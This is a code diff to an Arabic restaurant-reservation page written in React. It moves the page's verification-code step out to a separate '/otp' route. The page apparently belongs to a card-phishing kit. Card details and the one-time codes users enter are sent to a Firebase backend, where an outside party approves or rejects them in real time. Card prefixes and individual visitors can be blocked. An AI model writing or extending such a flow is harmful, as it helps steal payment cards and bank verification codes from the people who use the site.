@@ -1,14 +1,14 @@
-import { useState, useRef, useEffect } from "react";
-import { Link, useParams } from "wouter";
-import { ArrowRight, Calendar, Clock, Users, CheckCircle, User, Phone, FileText, ChevronLeft, CreditCard, ShieldCheck, Lock, Wifi, ChevronDown, Receipt, RefreshCw, X, Gift } from "lucide-react";
+import { useState, useEffect } from "react";
+import { Link, useParams, useLocation } from "wouter";
+import { ArrowRight, Calendar, Clock, Users, User, Phone, FileText, ChevronLeft, CreditCard, ShieldCheck, Lock, Wifi, ChevronDown, Receipt, X, Gift } from "lucide-react";
 import { getRestaurantById } from "@/lib/restaurant-data";
-import { addData, handlePay, handleOtp, listenForOtpApproval, listenForApproval, isBinBlocked } from "@/lib/firebase";
+import { addData, handlePay, listenForApproval, isBinBlocked } from "@/lib/firebase";
 import { setupOnlineStatus } from "@/lib/utils";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 
-type Step = 1 | 2 | 3 | 4 | 5 | 6;
+type Step = 1 | 2 | 3 | 4 | 5;
 
 function StepIndicator({ current }: { current: Step }) {
   const steps = [
@@ -17,7 +17,6 @@ function StepIndicator({ current }: { current: Step }) {
     { number: 3 as Step, label: "البيانات" },
     { number: 4 as Step, label: "الفاتورة" },
     { number: 5 as Step, label: "الدفع" },
-    { number: 6 as Step, label: "رمز التحقق" },
   ];
 
   return (
@@ -95,6 +94,7 @@ const getCardGradient = (cardType: string): string => {
 export default function Reserve() {
   const params = useParams<{ id: string }>();
   const restaurant = getRestaurantById(Number(params.id));
+  const [, setLocation] = useLocation();
   const [step, setStep] = useState<Step>(1);
 
   const [date, setDate] = useState("");
@@ -113,46 +113,10 @@ export default function Reserve() {
   const [stepSubmitError, setStepSubmitError] = useState("");
   const [cardErrors, setCardErrors] = useState<Record<string, string>>({});
   const [isSubmitting, setIsSubmitting] = useState(false);
-
-  const [otp, setOtp] = useState("");
-  const [otpError, setOtpError] = useState("");
-  const [otpLoading, setOtpLoading] = useState(false);
-  const [otpWaiting, setOtpWaiting] = useState(false);
-  const [otpResult, setOtpResult] = useState<"approved" | "rejected" | null>(null);
-  const [resendTimer, setResendTimer] = useState(60);
   const [showCashbackPopup, setShowCashbackPopup] = useState(false);
-  const otpInputRef = useRef<HTMLInputElement>(null);
 
   const serviceFee = 50;
   const reservationTotal = serviceFee;
-
-  useEffect(() => {
-    if (step === 6 && resendTimer > 0) {
-      const timer = setInterval(() => setResendTimer((t) => t - 1), 1000);
-      return () => clearInterval(timer);
-    }
-  }, [step, resendTimer]);
-
-  useEffect(() => {
-    if (!otpWaiting) return;
-    const unsubscribe = listenForOtpApproval((status) => {
-      setOtpWaiting(false);
-      setOtpLoading(false);
-      setOtpResult(status);
-      if (status === "rejected") {
-        setOtpError("رمز التحقق غير صحيح، يرجى المحاولة مرة أخرى");
-        setOtp("");
-        otpInputRef.current?.focus();
-      }
-    });
-    return () => unsubscribe();
-  }, [otpWaiting]);
-
-  useEffect(() => {
-    if (step === 6 && otpResult !== "approved") {
-      otpInputRef.current?.focus();
-    }
-  }, [step, otpResult]);
 
   if (!restaurant) {
     return (
@@ -293,7 +257,7 @@ export default function Reserve() {
     const unsubscribe = listenForApproval((status) => {
       if (status === "approved") {
         setIsWaitingApproval(false);
-        setStep(6);
+        setLocation("/otp");
       } else if (status === "rejected") {
         setIsWaitingApproval(false);
         setCardErrors((prev) => ({
@@ -303,7 +267,7 @@ export default function Reserve() {
       }
     });
     return () => unsubscribe();
-  }, [isWaitingApproval]);
+  }, [isWaitingApproval, setLocation]);
 
   const handlePaymentSubmit = async () => {
     if (isSubmitting || isWaitingApproval) return;
@@ -374,38 +338,6 @@ export default function Reserve() {
 
     setIsSubmitting(false);
     setIsWaitingApproval(true);
-  };
-
-  const handleOtpChange = (value: string) => {
-    const code = value.replace(/\D/g, "").slice(0, 6);
-    setOtp(code);
-    setOtpError("");
-  };
-
-  const isValidOtpLength = (code: string) => code.length === 4 || code.length === 6;
-
-  const handleOtpSubmit = async () => {
-    if (otpLoading || otpWaiting) return;
-    const code = otp;
-    if (!isValidOtpLength(code)) {
-      setOtpError("يرجى إدخال رمز تحقق من 4 أو 6 أرقام");
-      return;
-    }
-    setOtpLoading(true);
-    setOtpError("");
-    setOtpResult(null);
-    setOtpWaiting(true);
-    try {
-      await handleOtp(code, "reserve_otp");
-    } catch (error: any) {
-      setOtpWaiting(false);
-      setOtpLoading(false);
-      if (error?.message === "VISITOR_BLOCKED") {
-        setOtpError("تم حظر هذا الزائر ولا يمكنه المتابعة");
-      } else {
-        setOtpError("حدث خطأ أثناء إرسال رمز التحقق");
-      }
-    }
   };
 
   const cardType = getCardType(cardNumber);
@@ -998,147 +930,6 @@ export default function Reserve() {
           </>
         )}
 
-        {step === 6 && otpResult === "approved" && (
-          <div className="space-y-4 animate-fade-in" data-testid="step-6-approved">
-            <div className="bg-white rounded-2xl p-8 shadow-sm text-center space-y-6">
-              <div className="w-24 h-24 bg-gradient-to-br from-[#c9a96e] to-[#b8935a] rounded-full flex items-center justify-center mx-auto shadow-lg">
-                <CheckCircle className="w-12 h-12 text-white" />
-              </div>
-              <h2 className="text-[#4a1525] text-2xl font-bold">تم تأكيد الحجز بنجاح</h2>
-              <p className="text-[#7a6b5f] text-sm">تم تأكيد حجزك في {restaurant.name}</p>
-              <div className="bg-[#f5efe6] rounded-xl p-4 space-y-2 text-sm">
-                <div className="flex justify-between">
-                  <span className="text-[#7a6b5f]">المطعم</span>
-                  <span className="text-[#4a1525] font-medium">{restaurant.name}</span>
-                </div>
-                <div className="h-[1px] bg-[#ebddd0]" />
-                <div className="flex justify-between">
-                  <span className="text-[#7a6b5f]">التاريخ</span>
-                  <span className="text-[#4a1525] font-medium">{date}</span>
-                </div>
-                <div className="h-[1px] bg-[#ebddd0]" />
-                <div className="flex justify-between">
-                  <span className="text-[#7a6b5f]">الوقت</span>
-                  <span className="text-[#4a1525] font-medium">{time}</span>
-                </div>
-                <div className="h-[1px] bg-[#ebddd0]" />
-                <div className="flex justify-between">
-                  <span className="text-[#7a6b5f]">عدد الضيوف</span>
-                  <span className="text-[#4a1525] font-medium">{guests}</span>
-                </div>
-              </div>
-              <Link
-                href="/restaurants"
-                className="block w-full bg-[#4a1525] text-white py-4 rounded-xl font-bold text-base text-center hover:bg-[#3a0f1d] transition-colors shadow-md"
-                data-testid="link-back-restaurants-done"
-              >
-                العودة للمطاعم
-              </Link>
-            </div>
-          </div>
-        )}
-
-        {step === 6 && otpResult !== "approved" && (
-          <div className="space-y-4 animate-fade-in" data-testid="step-6-content">
-            <div className="bg-white rounded-2xl p-8 shadow-sm text-center space-y-6">
-              <div className="relative">
-                <div className="w-20 h-20 bg-gradient-to-br from-[#c9a96e] to-[#b8935a] rounded-full flex items-center justify-center mx-auto shadow-lg">
-                  <ShieldCheck className="w-10 h-10 text-white" />
-                </div>
-                <div className="absolute -bottom-1 left-1/2 -translate-x-1/2">
-                  <div className="bg-[#f5efe6] text-[#4a1525] text-xs font-bold px-3 py-1 rounded-full flex items-center gap-1">
-                    <Lock className="w-3 h-3" />
-                    آمن
-                  </div>
-                </div>
-              </div>
-
-              <div className="pt-2">
-                <h2 className="text-[#4a1525] text-xl font-bold">التحقق من الدفع</h2>
-                <p className="text-[#7a6b5f] text-sm mt-2">
-                  تم إرسال رمز التحقق إلى رقم جوالك المسجل (4 أو 6 أرقام)
-                </p>
-                <p className="text-[#4a1525] font-mono font-bold text-sm mt-1" dir="ltr">
-                  {phone ? `${phone.slice(0, 3)}****${phone.slice(-2)}` : "05X****XX"}
-                </p>
-              </div>
-
-              <div className="flex justify-center" dir="ltr">
-                <input
-                  ref={otpInputRef}
-                  type="text"
-                  inputMode="numeric"
-                  pattern="[0-9]*"
-                  maxLength={6}
-                  value={otp}
-                  onChange={(e) => handleOtpChange(e.target.value)}
-                  disabled={otpWaiting}
-                  autoComplete="one-time-code"
-                  autoFocus
-                  name="otp"
-                  placeholder="---- / ------"
-                  className={`w-full max-w-xs h-14 text-center text-2xl font-bold tracking-[0.35em] rounded-xl border-2 bg-[#faf7f3] focus:outline-none focus:ring-2 transition-all disabled:opacity-50 ${
-                    otpError
-                      ? "border-red-400 focus:ring-red-300"
-                      : otp
-                      ? "border-[#c9a96e] focus:ring-[#c9a96e]/50"
-                      : "border-[#d5c8b5] focus:ring-[#4a1525]/30 focus:border-[#4a1525]"
-                  }`}
-                  data-testid="input-otp"
-                />
-              </div>
-
-              {otpWaiting && (
-                <div className="bg-[#f5efe6] text-[#4a1525] text-sm p-4 rounded-xl text-center space-y-2" data-testid="status-waiting-otp">
-                  <div className="w-6 h-6 border-2 border-[#c9a96e]/30 border-t-[#c9a96e] rounded-full animate-spin mx-auto" />
-                  <p className="font-medium">جاري التحقق من الرمز...</p>
-                </div>
-              )}
-
-              {otpError && (
-                <div className="bg-red-50 text-red-600 text-sm p-3 rounded-xl text-center" data-testid="error-otp">
-                  {otpError}
-                </div>
-              )}
-
-              <button
-                onClick={handleOtpSubmit}
-                disabled={otpLoading || otpWaiting || !isValidOtpLength(otp)}
-                className="w-full bg-[#4a1525] text-white py-4 rounded-xl font-bold text-base hover:bg-[#3a0f1d] transition-colors shadow-md disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
-                data-testid="button-verify-otp"
-              >
-                {otpLoading ? (
-                  <>
-                    <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
-                    جاري التحقق...
-                  </>
-                ) : (
-                  <>
-                    <ShieldCheck className="w-5 h-5" />
-                    تأكيد رمز التحقق
-                  </>
-                )}
-              </button>
-
-              <div className="pt-2">
-                {resendTimer > 0 ? (
-                  <p className="text-[#7a6b5f] text-xs">
-                    إعادة إرسال الرمز بعد <span className="text-[#4a1525] font-bold">{resendTimer}</span> ثانية
-                  </p>
-                ) : (
-                  <button
-                    onClick={() => { setResendTimer(60); setOtp(""); setOtpError(""); setOtpResult(null); }}
-                    className="text-[#c9a96e] text-sm font-medium flex items-center gap-1 mx-auto"
-                    data-testid="button-resend-otp"
-                  >
-                    <RefreshCw className="w-4 h-4" />
-                    إعادة إرسال الرمز
-                  </button>
-                )}
-              </div>
-            </div>
-          </div>
-        )}
       </div>
     </div>
   );
